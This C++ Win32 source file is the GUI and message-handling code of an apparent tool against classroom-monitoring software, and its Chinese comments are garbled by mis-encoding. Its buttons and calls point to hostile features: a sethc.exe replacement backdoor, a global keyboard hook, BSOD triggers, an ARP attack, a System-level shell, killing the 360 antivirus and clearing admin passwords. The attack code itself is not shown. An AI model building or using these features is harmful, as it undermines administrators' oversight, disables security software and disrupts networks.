	myZeroMemory(CmdLine, sizeof(wchar_t) * MAX_PATH);
	GetRealCommandLine(CmdLine);

	if (Admin)//�ж��Ƿ�Ϊ�������
		if (mywcslen(CmdLine) > 1) {
			if (mywcscmp(Name, L"C:\\SAtemp\\myPaExec.exe") == 0) { myPAExec(TRUE); return 0; }
			if (mywcscmp(Name, L"C:\\SAtemp\\myPaExec2.exe") == 0) { myPAExec(FALSE); return 0; }
		}
	Main.str._t.InitRBTree();Main.but._t.InitRBTree();
	Eatpid._t.InitRBTree();expid._t.InitRBTree();
	tdpid._t.InitRBTree();//������Map����

	GetBit();//��ȡϵͳλ��
	if (Bit != 34)
		mywcscpy(SethcPath, L"C:\\Windows\\System32\\sethc.exe");
	else//����ϵͳλ������SethcPath
		mywcscpy(SethcPath, L"C:\\Windows\\SysNative\\sethc.exe");

	BackupSethc();//����sethc

	CreateStrs; //�����ַ���

	mywcscpy(TDName, L"StudentMain.exe");

	if (mywcslen(CmdLine) > 1) if (RunCmdLine(CmdLine) == TRUE)return 0;

	CreateDesktop(szVDesk, NULL, NULL, DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, NULL);//������������

	SetProcessAware();//��ϵͳ������������������,��һЩ�ʼǱ�������

	hInst = GetModuleHandle(0); // ��ʵ������洢��ȫ�ֱ�����
	if (!InitInstance())return FALSE;//�ͳ�������йصĳ�ʼ��
	MSG msg;//��Ϣѭ��: 
	while (GetMessageW(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);//������Ϣ
	}
	return (int)msg.wParam;
}

DWORD WINAPI InitThread(LPVOID pM)//�������ֿؼ�(�߳�)
{
	(pM);
	Main.CreateEditEx(325 + 5, 220, 110 - 10, 50, 1, L"explorer.exe", 0, FALSE);//���������
	Main.CreateEditEx(195 + 5, 355, 240 - 10, 45, 1, L"StudentMain.exe", 0, FALSE);
	Main.CreateEditEx(455 + 5, 355, 50 - 10, 45, 1, L"5", 0, FALSE);
	Main.CreateEditEx(185 + 5, 102, 110 - 10, 40, 2, L"�����¶˿�", 0, TRUE);
	Main.CreateEditEx(365 + 5, 175, 210 - 10, 50, 2, L"����������", 0, TRUE);
	Main.CreateEditEx(195 + 5, 102, 310 - 10, 37, 3, L"����ļ�/�ļ���", 0, TRUE);
	Main.CreateEditEx(277 + 5, 186, 138 - 10, 25, 5, L"StudentMain", 0, FALSE);

	Main.CreateButtonEx(1, 1, 50, 139, 64, 0, L"��Ҫ����", LLGreyBrush, DBlueBrush, LBlueBrush, WhitePen, DBluePen, LBluePen, 0, TRUE, 0, 0, L"P1");//�л�ҳ�水ť
	Main.CreateButtonEx(2, 1, 115, 139, 64, 0, L"���򹤾���", LLGreyBrush, DBlueBrush, LBlueBrush, WhitePen, DBluePen, LBluePen, 0, TRUE, 0, 0, L"P2");//
	Main.CreateButtonEx(3, 1, 180, 139, 64, 0, L"��������", LLGreyBrush, DBlueBrush, LBlueBrush, WhitePen, DBluePen, LBluePen, 0, TRUE, 0, 0, L"P3");
	Main.CreateButtonEx(4, 1, 245, 139, 64, 0, L"����", LLGreyBrush, DBlueBrush, LBlueBrush, WhitePen, DBluePen, LBluePen, 0, TRUE, 0, 0, L"P4");
	Main.CreateButtonEx(5, 1, 310, 139, 64, 0, L"����", LLGreyBrush, DBlueBrush, LBlueBrush, WhitePen, DBluePen, LBluePen, 0, TRUE, 0, 0, L"P5");
	Main.CreateButtonEx(6, 1, 375, 139, 173, 0, L"һ����װ", LGreyBrush, DBlueBrush, LBlueBrush, WhitePen, DBluePen, LBluePen, 0, TRUE, 0, 0, L"QS");
	Main.CurButton = 6;
	Main.CreateLine(140, 51, 498, LINE_Y, 0, COLOR_DARKER_GREY);
	Main.CreateLine(0, 51, 498, LINE_Y, 0, COLOR_DARKER_GREY);//�л�ҳ�水ť���ϵ���
	Main.CreateLine(2, 114, 137, LINE_X, 0, COLOR_DARKER_GREY);
	Main.CreateLine(2, 179, 137, LINE_X, 0, COLOR_DARKER_GREY);
	Main.CreateLine(2, 244, 137, LINE_X, 0, COLOR_DARKER_GREY);
	Main.CreateLine(2, 309, 137, LINE_X, 0, COLOR_DARKER_GREY);
	Main.CreateLine(2, 374, 137, LINE_X, 0, COLOR_DARKER_GREY);
	Main.CreateLine(DEFAULT_WIDTH + 1, 50, DEFAULT_HEIGHT + 1 - 50, LINE_Y, 0, COLOR_DARKER_GREY);//ҳ�����ұߵ���

	Main.CreateFrame(170, 75, 419, 95, 1, L" ���̷��� ");
	Main.CreateButton(195, 100, 110, 50, 1, L"��װsethc", L"Sethc");//sethc
	Main.CreateButton(325, 100, 110, 50, 1, L"ȫ�ּ��̹���", L"hook");//hook
	if (SethcState)
	{
		WIN32_FIND_DATA fileInfo;
		HANDLE hFind = FindFirstFile(SethcPath, &fileInfo);
		if (hFind != INVALID_HANDLE_VALUE && fileInfo.nFileSizeLow == MYSETHC_SIZE)
		{//�ж�sethc�Ƿ��Ѿ���װ
			SethcInstallState = TRUE;
			mywcscpy(Main.Button[Main.CurButton - 1].Name, Main.GetStr(L"unSet"));
		}
		FindClose(hFind);
	}

	Main.CreateFrame(170, 195, 419, 320, 1, L" ���ڷ��� ");//��������ϵ��
	Main.CreateButton(195, 220, 110, 50, 1, L"���г���", L"runinVD");
	Main.CreateButton(455, 220, 110, 50, 1, L"�л�����", L"SwitchD");
	Main.CreateText(195, 285, 1, L"Tctrl+b", COLOR_ORANGE);
	Main.CreateLine(185, 315, 380, LINE_X, 1, COLOR_BLACK);

	Main.CreateButton(195, 415, 110, 50, 1, L"��׽����", L"CatchW");
	Main.CreateButton(325, 415, 110, 50, 1, L"���Ӵ���", L"CopyW");//��׽����ϵ��
	Main.CreateButton(455, 415, 110, 50, 1, L"�ͷŴ���", L"ReturnW");
	Main.CreateText(195, 328, 1, L"Processnam", COLOR_DARKERR_GREY);//��Ҫ��׽�Ľ�����
	Main.CreateText(455, 328, 1, L"Delay", COLOR_DARKERR_GREY);//�ӳ�ʱ��
	Main.CreateText(510, 370, 1, L"second", COLOR_DARKERR_GREY);//s
	Main.CreateText(195, 480, 1, L"_Eat", COLOR_DARKER_BLUE);
	Main.Button[BUT_RELS].Enabled = FALSE;

	Main.CreateFrame(160, 75, 160, 146, 2, L" Ƶ������ ");//����"����Ա����"ϵ��
	Main.CreateFrame(345, 75, 250, 280, 2, L" ����Ա���빤�� ");
	Main.CreateText(365, 300, 2, L"Tcp1", COLOR_DARKEST_GREY);
	Main.CreateText(365, 325, 2, L"Tcp2", COLOR_ORANGE);
	Main.CreateLine(360, 160, 223, LINE_X, 2, COLOR_BLACK);

	Main.CreateFrame(160, 385, 160, 130, 2, L" ������̹��� ");
	Main.CreateText(175, 405, 2, L"TDState", 0);
	Main.CreateText(175, 430, 2, L"TDPID", 0);
	Main.CreateText(250, 405, 2, L"TcmdNO", COLOR_RED);

	Main.CreateFrame(170, 75, 410, 150, 3, L" �ļ������ ");
	Main.CreateText(195, 185, 3, L"T.A.", 0);

	Main.CreateFrame(170, 255, 273, 105, 3, L" ��Դ - ���� ");
	Main.CreateFrame(170, 388, 410, 105, 3, L" ���� ");

	Main.CreateText(325, 75, 4, L"Tcoder", NULL);//"����"�е�һ������
	Main.CreateText(325, 100, 4, L"Tver", NULL);
	Main.CreateText(372, 125, 4, L"Tver2", NULL);
	Main.CreateText(325, 150, 4, L"Tweb", NULL);
	Main.CreateText(372, 150, 4, L"Tweb2", COLOR_WEB_BLUE);
	Main.CreateText(170, 255, 4, L"Ttip1", NULL);
	Main.CreateText(170, 280, 4, L"Ttip2", NULL);
	Main.CreateText(170, 315, 4, L"Tbit", NULL);//һЩϵͳ��Ϣ��text
	Main.CreateText(285, 315, 4, L"Twinver", NULL);
	Main.CreateText(455, 315, 4, L"Tcmd", NULL);
	Main.CreateText(170, 340, 4, L"TTDv", NULL);
	Main.CreateText(375, 340, 4, L"TIP", NULL);
	Main.CreateText(170, 365, 4, L"TPath", NULL);
	Main.CreateLine(170, 398, 420, LINE_X, 4, COLOR_BLACK);
	Main.CreateText(170, 416, 4, L"_Tleft", NULL);
	Main.CreateText(170, 441, 4, L"Tleft2", NULL);
	
	Main.CreateText(240, 455, 5, L"nolg", COLOR_DARKEST_GREY);
	Main.CreateText(177, 375, 5, L"swlg", COLOR_DARKEST_GREY);

	Main.CreateFrame(655, 75, 170, 420, 0, L" ��Ϸ - ������ ");
	Main.CreateFrame(169, 69, 136, 171, 4, L"");

	Main.CreateArea(20, 10, 32, 32, 0);//����ͼ��
	Main.CreateArea(170, 70, 135, 170, 4);//zxfͷ��
	Main.CreateArea(170, 365, 80, 20, 4);//��ѡ����·��
	
	Main.CreateArea(176, 15, 85, 18, 0);//�Թ���ԱȨ������
Main.CreateArea(370, 148, 170, 40, 4);//
	if (Admin == 0)Main.CreateText(60, 17, 0, L"Tmain", COLOR_WHITE);
	else Main.CreateText(60, 17, 0, L"Tmain2", COLOR_WHITE);

	Main.CreateButtonEx(0, 530, 10, 60, 30, 0, L"��", \
		CreateSolidBrush(COLOR_CLOSE_LEAVE), CreateSolidBrush(COLOR_CLOSE_HOVER), CreateSolidBrush(COLOR_CLOSE_PRESS), \
		CreatePen(PS_SOLID, 1, COLOR_CLOSE_LEAVE), CreatePen(PS_SOLID, 1, COLOR_CLOSE_HOVER), CreatePen(PS_SOLID, 1, COLOR_CLOSE_PRESS), \
		Main.DefFont, 1, FALSE, COLOR_WHITE, L"Close");//�رհ�ť

	Main.Frame[FRA_POWER].rgb = COLOR_LIGHT_ORANGE;
	Main.Frame[FRA_PASSWORD].rgb = COLOR_NOTREC;
	Main.Frame[FRA_TOPDOMAIN].rgb = COLOR_DARKER_BLUE;
	RefreshFrameText();//�ı�Frame��ɫ������
	return 0;
}

BOOL InitInstance()//��ʼ��
{
	InitBrushs;//�������� & ��ˢ
	InitHotKey();//��ʼ���ȼ�ϵͳ

	Main.InitClass(hInst);//��ʼ��Class

	Main.Width = DEFAULT_WIDTH; Main.Height = DEFAULT_HEIGHT;

	GetDeviceRect();
	if (yLength >= 1400)Main.DPI = 1.5;//������Ļ�߶�Ԥ���趨���ű���
	if (yLength <= 1000)Main.DPI = 0.75;//����Ļ�ֱ��ʽϵ͵ĵ������Զ����ͻ���
	if (yLength <= 600)Main.DPI = 0.5;
	if (yLength <= 1070)LowResource = TRUE;//ע:�⼸�д���һ��Ҫ���ڴ��ڴ���֮ǰ

	Main.DefFont = CreateFontW(max((int)(16 * Main.DPI), 10), max((int)(8 * Main.DPI), 5),//����Ĭ������
		0, 0, FW_THIN, FALSE, FALSE, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, PROOF_QUALITY, DEFAULT_PITCH | FF_SWISS, L"����");

	Main.SetTitleBar(COLOR_TITLE_1, TITLEBAR_HEIGHT);//����TitleBar

	if (!MyRegisterClass(hInst, WndProc, szWindowClass, CS_DROPSHADOW))return FALSE;//ע�ᴰ����

	//���̳߳�ʼ��
	//����CreateWindowEx��Ҫ��ʱ����InitThread��7��������㹻�����ﲻ�����߳�ͬ��
	CreateThread(0, 0, InitThread, 0, 0, 0);

	Main.hWnd = CreateWindowEx(WS_EX_LAYERED, szWindowClass, Main.GetStr(L"Tmain2"), WS_POPUP, 290, 290, \
		(int)(DEFAULT_WIDTH * Main.DPI), (int)(DEFAULT_HEIGHT * Main.DPI), NULL, nullptr, hInst, nullptr);//����������

	if (!Main.hWnd)return FALSE;//����������ʧ�ܾ�ֱ���˳�

	Main.ButtonEffect = TRUE;//��ť����ɫ��Ч
	SetTimer(Main.hWnd, TIMER_BUTTONEFFECT, 5, (TIMERPROC)TimerProc);//���ý���ɫ��ʱ��
	SetLayeredWindowAttributes(Main.hWnd, NULL, 234, LWA_ALPHA);//��͸����Ч

	if (!slient)AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_SHOW, MOD_CONTROL, 'P');//ע���ȼ���ʾ ����
	RegisterHotKey(Main.hWnd, MAIN_HOTKEY_VDESKTOP, MOD_CONTROL, 'B');//�л�����

	AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_CTRL_ALT_K, MOD_CONTROL | MOD_ALT, 'K');//���̿������
	if (FirstFlag)AutoRegisterHotKey(Main.hWnd, MAIN_HOTKEY_AUTOKILLTD, NULL, VK_SCROLL);//��һ������ʱ�Զ�"һ����װ"

	if (!LowResource)
		if (GetSystemDefaultLangID() == 0x0409)//Ӣ��ϵͳ���Զ��л�����
		{
			wchar_t Tempstr[MAX_STR];//ȱ���������ٶȻ����ܶ�
			ReleaseLanguageFiles(TDTempPath, 1, Tempstr);
			SwitchLanguage(Tempstr);
		}

	Main.Timer = GetTickCount();//�ر�ע��: GetTickCount����ʵʱ���ͣ�������ϵͳÿ18ms����һ�Σ��������С����Ϊ18ms(ժ�԰ٶȰٿ�)
	if ((Main.Timer % 49) == 0)Main.SetTitleBar(COLOR_PINK, TITLEBAR_HEIGHT);//��˽�GetTickCountȡģʱ�����18�����Լ������1���ͻ���ɸ��ʲ���ȷ������
	if ((Main.Timer % 0x513) == 0)Main.SetTitleBar(COLOR_PIRPLE, TITLEBAR_HEIGHT);//���� Main.Timer % 50 == 0 ������䣬ʵ�ʴ���������25��֮1

	SetTimer(Main.hWnd, TIMER_EXPLAINATION, 250, (TIMERPROC)TimerProc);//����Exp��ʱ��
	if (!slient)//��ʾ������
	{
		ShowWindow(Main.hWnd, SW_SHOW);FE = FALSE;
		Main.Redraw();
	}

	Main.CreateButton(185, 155, 110, 45, 2, L"Ӧ��", L"ApplyCh");//Ϊ�˼ӿ������ٶȶ�����ʾ�����ں󴴽��İ�ť
	Main.CreateButton(365, 102, 97, 45, 2, L"�������", L"ClearPass");
	Main.CreateButton(477, 102, 97, 45, 2, L"�鿴����", L"ViewPass");
	Main.CreateButton(365, 237, 97, 50, 2, L"���ܷ���1", L"CP1");
	Main.CreateButton(477, 237, 97, 50, 2, L"���ܷ���2", L"CP2");

	Main.CreateCheck(165, 238, 2, 135, L" αװ��������");
	Main.CreateCheck(165, 264, 2, 135, L" αװ��������");
	Main.CreateCheck(165, 290, 2, 135, L" αװ����ͼ��");
	Main.CreateCheck(165, 316, 2, 170, L" ����������������");
	Main.CreateCheck(165, 342, 2, 170, L" Ctrl+Y ��������");

	Main.CreateButton(175, 458, 60, 42, 2, L"����", L"kill-TD");
	Main.Button[Main.CurButton].Enabled = FALSE;
	Main.CreateButton(245, 458, 60, 42, 2, L"����", L"re-TD");

	Main.CreateButton(345, 385, 115, 55, 2, L"�Զ���׽����", L"catchTD");
	Main.CreateButton(480, 385, 115, 55, 2, L"��ֹ��ʦ�ػ�", L"ANTI-");
	Main.CreateButton(345, 460, 115, 55, 2, L"��ʾ�ڰ�ȫ����", L"desktop");
	Main.CreateButton(480, 460, 115, 55, 2, L"�Զ�������", L"auto-5");//24

	Main.CreateButton(520, 102, 36, 36, 3, L"...", L"viewfile");
	Main.CreateButton(436, 151, 120, 55, 3, L"���ļ���", L"folder");
	Main.CreateButton(325, 151, 97, 55, 3, L"��ʼ����", L"Delete");
	Main.CreateCheck(195, 160, 3, 100, L" ��������");

	Main.CreateButton(192, 280, 115, 60, 3, L"BSOD(����)", L"BSOD");
	Main.CreateButton(324, 280, 100, 60, 3, L"��������", L"Res");

	Main.CreateButton(192, 412, 100, 60, 3, L"ARP����", L"ARP");
	Main.CreateButton(304, 412, 140, 60, 3, L"SystemȨ��CMD", L"sysCMD");
	Main.CreateButton(455, 412, 105, 60, 3, L"�ɵ�360", L"Killer");//32

	Main.CreateButton(490, 414, 100, 50, 4, L"�����ĵ�", L"more");
	Main.CreateButton(490, 476, 100, 50, 4, L"ϵͳ��Ϣ", L"info");//34

	Main.CreateCheck(180, 70, 5, 100, L" �����ö�");
	Main.CreateCheck(180, 100, 5, 160, L" Ctrl+R ��������");
	Main.CreateCheck(180, 130, 5, 160, L" Ctrl+T ��������");
	Main.CreateCheck(180, 160, 5, 200, L" Ctrl+Alt+P ��ͼ/��ʾ");
	Main.CreateCheck(180, 190, 5, 94, L" ��������                   .exe");
	Main.CreateCheck(180, 220, 5, 230, L" (��������) ��ȫƥ�������");
	Main.CreateCheck(180, 250, 5, 130, L" ��ֹ������");
	Main.CreateCheck(180, 280, 5, 230, L" Ctrl+Alt+K ���̲������");
	Main.CreateCheck(180, 310, 5, 110, L" ��С/�Ŵ�");
	Main.CreateCheck(180, 340, 5, 245, L" ʹ��ProcessHacker��������");

	Main.CreateButton(470, 404, 105, 50, 5, L"��������", L"hidest");
	Main.CreateButton(470, 464, 105, 50, 5, L"�����˳�", L"clearup");//36

	Main.CreateButton(466, 255, 115, 106, 3, L"����Ϸ", L"Games");//37
	Main.CreateButton(680, 95, 120, 50, 0, L"С�ɲ´�", L"G1");
	Main.CreateButton(680, 160, 120, 50, 0, L"Flappy Bird", L"G2");
	Main.CreateButton(680, 225, 120, 50, 0, L"2048", L"G3");
	Main.CreateButton(680, 290, 120, 50, 0, L"����˹����", L"G4");
	Main.CreateButton(680, 355, 120, 50, 0, L"�������", L"G5");
	Main.CreateButton(680, 420, 120, 50, 0, L"������", L"G6");//43

	if ((Main.Timer % 3) == 0 && FirstFlag && !slient)
	{
		Main.InfoBox(L"Firststr");
		if ((Main.Timer % 49) == 0)Main.InfoBox(L"First2");
	}

	return TRUE;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)//��������Ӧ����
{

	switch (message)
	{
	case WM_CLOSE: {MyExitProcess(); break; }//�ر�
	case WM_CREATE://��������
	{
		Main.WindowPreparation(xLength, yLength);//��������dc��bitmap
		DragAcceptFiles(hWnd, TRUE);//��������ļ���ק��Ϣ

		break;
	}
	case WM_HOTKEY://�ȼ�
	{

		switch (wParam)
		{
		case MAIN_HOTKEY_SHOW: //���� \ ��ʾ
		{
			if (HideState == -1)break;//��������ʱ����ʾ
			ShowWindow(Main.hWnd, 5 * HideState);
			if (CatchWnd)ShowWindow(CatchWnd, 5 * HideState);
			HideState = !HideState;
			break;
		}
		case MAIN_HOTKEY_VDESKTOP: {CreateThread(0, 0, SDThread, 0, 0, 0); break; }//�л�����
		case MAIN_HOTKEY_AUTOKILLTD: {if (HookState)AutoTerminateTD(); break; }//Scroll Lock��������
		case MAIN_HOTKEY_BSOD: {BSOD(0); break; }//Ctrl+R����
		case MAIN_HOTKEY_RESTART: {Restart(); break; }//Ctrl+T����
		case MAIN_HOTKEY_SCREENSHOT://��ͼ or ��ʾ
		{
			++ScreenState;
			if (ScreenState == 1)CaptureImage();
			if (ScreenState == 2)
				CreateWindow(ScreenWindow, L"You can't see me.", WS_POPUP | WS_VISIBLE, 0, 0, xLength, yLength, nullptr, nullptr, hInst, nullptr);
			break;
		}
		case MAIN_HOTKEY_CTRL_ALT_K:
		{
			if (Main.Check[CHK_KEYCTRL].Value == FALSE)RegMouseKey(), Main.Check[CHK_KEYCTRL].Value = TRUE; else UnMouseKey(), Main.Check[CHK_KEYCTRL].Value = FALSE;
			if (Main.CurWnd == 5)Main.Readd(REDRAW_CHECK, CHK_KEYCTRL), Main.Redraw(Main.GetRECTc(CHK_KEYCTRL));
			break;//���̲������
		}
		case MAIN_HOTKEY_LEFTKEY: {mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); break; }//���
		case MAIN_HOTKEY_RIGHTKEY: { mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); break; }//�Ҽ�
		case MAIN_HOTKEY_MOVELEFT: {mouse_event(MOUSEEVENTF_MOVE, 0xffffffff - (DWORD)(10 * Main.DPI) + 1, 0, 0, 0); break; }//����
		case MAIN_HOTKEY_MOVEUP: {mouse_event(MOUSEEVENTF_MOVE, 0, 0xffffffff - (DWORD)(10 * Main.DPI) + 1, 0, 0); break; }//����
		case MAIN_HOTKEY_MOVERIGHT: {mouse_event(MOUSEEVENTF_MOVE, (DWORD)(10 * Main.DPI), 0, 0, 0); break; }//����
		case MAIN_HOTKEY_MOVEDOWN: {mouse_event(MOUSEEVENTF_MOVE, 0, (DWORD)(10 * Main.DPI), 0, 0); break; }//����
		case MAIN_HOTKEY_RESTART_TD: {if (TDPID == 0)CreateThread(NULL, 0, ReopenThread, NULL, 0, NULL); break; }//���´򿪼���
		default:Main.EditHotKey((int)wParam); break;//����Edit�������ȼ���Ϣ
		}
		break;
	}
	case WM_KILLFOCUS://����¼������ ѡ�� ��������ʱ���� 
	{//���������"�Ƴ�"����
		if (!UTState)Main.EditUnHotKey();
		for (int i = 0; i <= Main.CurButton; ++i)Main.Button[i].Percent = 0;
		break;
	}
	case WM_PAINT://��ͼ
	{
		HBRUSH BitmapBrush = NULL; HICON hicon;
		RECT rc; PAINTSTRUCT ps;
		myZeroMemory(&rc, sizeof(RECT));
		myZeroMemory(&ps, sizeof(PAINTSTRUCT));
		if (lParam == UT_MESSAGE)goto finish;
		if (hWnd != 0)GetUpdateRect(hWnd, &rc, FALSE);

		if (hWnd != 0)Main.tdc = BeginPaint(hWnd, &ps);

		if (Main.RedrawObject()) { goto finish; }

		SelectObject(Main.hdc, WhiteBrush);//��ӡ��ɫ����
		SelectObject(Main.hdc, WhitePen);
		Rectangle(Main.hdc, 0, 0, (int)(Main.Width * Main.DPI), (int)(Main.Height * Main.DPI + 1));

		if (FE) { FE = false; return 0; }
		Main.DrawTitleBar();

		Main.DrawEVERYTHING();//�ػ�ȫ��

		hicon = LoadIconW(hInst, MAKEINTRESOURCE(IDI_GUI));
		DrawIconEx(Main.hdc, (int)(20 * Main.DPI), (int)(10 * Main.DPI), hicon, (int)(32 * Main.DPI), (int)(32 * Main.DPI), 0, NULL, DI_NORMAL | DI_COMPAT);
		DeleteObject(hicon);

		if (Main.CurWnd == 4)
		{
			LoadPicture(L"C:\\SAtemp\\xiaofei.jpg", Main.hdc, 170, 70, Main.DPI);//����xiaofeiͷ��
			if (EasterEggFlag)
			{
				if (hZXFsign == nullptr)hZXFsign = (HBITMAP)LoadImage(hInst, MAKEINTRESOURCE(IDB_ZXF2), IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);//����ǩ��

				BitmapBrush = CreatePatternBrush(hZXFsign);//����xiaofeiǩ��
				SelectObject(Main.hdc, BitmapBrush);
				SelectObject(Main.hdc, WhitePen);
				Rectangle(Main.hdc, 0, 74 * 12, 99 * 1, 74 * 13);//����bitmap������Ӧ����825,С��975
				StretchBlt(Main.hdc, (int)(170 * Main.DPI), (int)(465 * Main.DPI), (int)(99 * Main.DPI), (int)(74 * Main.DPI), Main.hdc, 0, 74 * 12, 99, 74, SRCCOPY);
				DeleteObject(BitmapBrush);
			}
		}
	finish://��ͼ


		if (UTState)//"�����ö�"����ʱ,����ʹ��ϵͳ�Դ���Caret,����ֻ���Լ�����
		{
			const int count = GetTickCount();
			if (Main.ShowCrt && Main.CoverEdit != 0 && ((count / 1000.0 - count / 1000) < 0.5))
				SelectObject(Main.hdc, BlackPen); else SelectObject(Main.hdc, WhitePen);
			Rectangle(Main.hdc, Main.CaretPos.x, Main.CaretPos.y + 2, Main.CaretPos.x + 1, Main.CaretPos.y + (int)(22 * Main.DPI));
		}

		if (!UTState)
		{
			BitBlt(Main.tdc, rc.left, rc.top, max((long)(Main.Width * Main.DPI), rc.right - rc.left), \
				max((long)(Main.Height * Main.DPI), rc.bottom - rc.top), Main.hdc, rc.left, rc.top, SRCCOPY);
		}
		else
			if (HideState == 0)
			{
				DeskDC = GetDC(0);
				BitBlt(DeskDC, UTrc.left, UTrc.top, UTrc.right - UTrc.left, UTrc.bottom - UTrc.top, Main.hdc, 0, 0, SRCCOPY);
				ReleaseDC(Deskwnd, DeskDC);
			}
		if (hWnd != 0)EndPaint(hWnd, &ps);
	}

	case 34:
		if (lParam == WM_LBUTTONUP)
		{//���αװ�ļ���ͼzhuang��bu��xua��qu��le����
			NOTIFYICONDATA tnd;
			tnd.cbSize = sizeof(NOTIFYICONDATA);
			tnd.hWnd = Main.hWnd;
			tnd.uID = 1;
			Shell_NotifyIcon(NIM_DELETE, &tnd);
			CreateThread(0, 0, ReopenThread, 0, 0, 0);
			Main.Check[CHK_TOOLBAR].Value = FALSE;
		}
		break;
	case WM_COMMAND://���ؼ����յ���Ϣʱ�ᴥ�����
	{
		if (HIWORD(wParam) == LBN_SELCHANGE) {//TDT��ֻ����Listһ���ؼ���������������ݿ϶����ļ�ѡ�����= =
			wchar_t LanguageName[MAX_PATH], LanguagePath[MAX_PATH];
			SendMessage(FileList, LB_GETTEXT, ::SendMessage(FileList, LB_GETCURSEL, 0, 0), (LPARAM)LanguageName);
			mywcscpy(LanguagePath, TDTempPath);
			mywcscat(LanguagePath, L"language\\");
			mywcscat(LanguagePath, LanguageName);
			SwitchLanguage(LanguagePath);//���ݵ�������ݺϳ��ַ�����Ȼ���л�����
		}
		break;
	}
	case WM_LBUTTONDOWN://����������ʱ
	{
		if (UTState && lParam != UT_MESSAGE)break;//UltraTopMostʱ����ȫ�ּ��̹�������ȡ������Ϣ
		if (SizingLock)break;
		const POINT p = Main.GetPos();
		if (p.x + p.y > (int)((Main.Width + Main.Height) * Main.DPI) - 30 && !SizingLock && !LowResource)
		{
			CreateThread(NULL, 0, SizingThread, NULL, 0, NULL);
			HCURSOR hc = LoadCursor(NULL, IDC_SIZENWSE);
			SetCursor(hc);
			DeleteObject(hc);
			SizingLock = true;
			break;
		}

		if (Main.TestInside())
		{
			if (KEY_DOWN(VK_CONTROL))
			{
				POINT point = Main.GetPos();
				if (Main.CoverButton != 0)
				{
					DragState.first = DRAG_BUTTON, DragState.second = Main.CoverButton;
					DragDefPoint = { (long)(point.x / Main.DPI) - Main.Button[Main.CoverButton].Left,(long)(point.y / Main.DPI) - Main.Button[Main.CoverButton].Top };
				}
				if (Main.CoverEdit != 0)
				{
					DragState.first = DRAG_EDIT; DragState.second = Main.CoverEdit;
					DragDefPoint = { (long)(point.x / Main.DPI) - Main.Edit[Main.CoverEdit].Left,(long)(point.y / Main.DPI) - Main.Edit[Main.CoverEdit].Top };
				}
				if (Main.CoverCheck != 0)
				{
					DragState.first = DRAG_CHECK; DragState.second = Main.CoverCheck;
					DragDefPoint = { (long)(point.x / Main.DPI) - Main.Check[Main.CoverCheck].Left,(long)(point.y / Main.DPI) - Main.Check[Main.CoverCheck].Top };
				}
				if (!Main.InsideEdit(Main.CoverEdit, point) && Main.CoverEdit != 0)
				{
					Main.Edit[Main.CoverEdit].Pos1 = Main.Edit[Main.CoverEdit].Pos2 = 0;
					const int TempCoverEdit = Main.CoverEdit;//ԭ��һ��Edit������
					Main.CoverEdit = 0;//�����������Ǹ�Edit����ʱ
					Main.EditRedraw(TempCoverEdit);//��Ҫ��CoverEdit��Ϊ0;
					Main.EditUnHotKey();//ȡ���ȼ�
				}
			}
			else
				Main.LeftButtonDown();
		}
		else//���ڿؼ��� -> �����ؼ���Ч
		{
			if (UTState)
			{//UltraTopMostʱ������ʱ�����϶�����
				GetCursorPos(&UTMpoint);
				UTMpoint2 = UTMpoint;
				ScreenToClient(Main.hWnd, &UTMpoint);
				SetTimer(Main.hWnd, TIMER_UT3, 1, (TIMERPROC)TimerProc);
			}
			else
			{
				PostMessage(Main.hWnd, WM_SYSCOMMAND, SC_MOVE | HTCAPTION, 0);//�������� -> �϶�����
				SetWindowPos(Main.hWnd, 0, 0, 0, (int)(Main.Width * Main.DPI), (int)(Main.Height * Main.DPI), SWP_NOMOVE | SWP_NOZORDER);
			}
		}
		break;
	}
	case WM_LBUTTONUP://̧��������ʱ
	{
		if (UTState && lParam != UT_MESSAGE)break;//UltraTopMostʱ�����ڲ���Ӧ��Ϣ

		Main.LeftButtonUp();
		if (DragState.first > 0) { DragState.first = FALSE; break; }
		const POINT point = Main.GetPos();
		
		switch (Main.CoverArea)
		{
		//s(Main.CoverArea);
		case 1://������Ͻ�logo�л���ɫ
		{//(���ع���)
			CHOOSECOLOR cc;
			myZeroMemory(&cc, sizeof(CHOOSECOLOR));
			cc.lStructSize = sizeof(cc);
			cc.lpCustColors = crCustColors;
			cc.Flags = CC_ANYCOLOR;
			if (!ChooseColor(&cc))break;//ѡ��"ȡ��"ʱ���л���ɫ
			if (GetRValue(cc.rgbResult) + GetGValue(cc.rgbResult) + GetBValue(cc.rgbResult) <= 384)
				Main.Text[29].rgb = COLOR_WHITE; else Main.Text[29].rgb = COLOR_BLACK;//����Textʱ�ǵø���"27"�������
			Main.SetTitleBar(cc.rgbResult, TITLEBAR_HEIGHT);
			Main.Redraw({ 0, 0, (int)(Main.Width * Main.DPI), (int)(50 * Main.DPI) });
			break;
		}
		case 2://��ʾxiaofeiǩ��
		{
			SetTimer(Main.hWnd, TIMER_COPYLEFT, 20, (TIMERPROC)TimerProc);
			EasterEggFlag = TRUE;//
			break;//
		}
		case 3:
		{//�ֶ�ѡ����·��
			OPENFILENAMEW ofn;
			wchar_t strFile[MAX_PATH], str2[MAX_PATH];
			myZeroMemory(str2, sizeof(wchar_t) * MAX_PATH);
			myZeroMemory(strFile, sizeof(wchar_t) * MAX_PATH);
			myZeroMemory(&ofn, sizeof(OPENFILENAMEW));
			if (*TDPath != 0)
			{
				mywcscpy(str2, TDPath);
				for (int i = (int)mywcslen(str2) - 1; i >= 0; --i)
					if (str2[i] == L'\\') {//�ѳ������ַ��������һ��"\\"������ַ�ȥ������·��
						str2[i + 1] = 0; break;
					}
			}
			ofn.lStructSize = sizeof(OPENFILENAME);
			ofn.lpstrFile = strFile;
			ofn.nMaxFile = MAX_PATH;
			ofn.Flags = OFN_FILEMUSTEXIST;
			ofn.lpstrInitialDir = str2;
			if (GetOpenFileName(&ofn) == TRUE)
			{
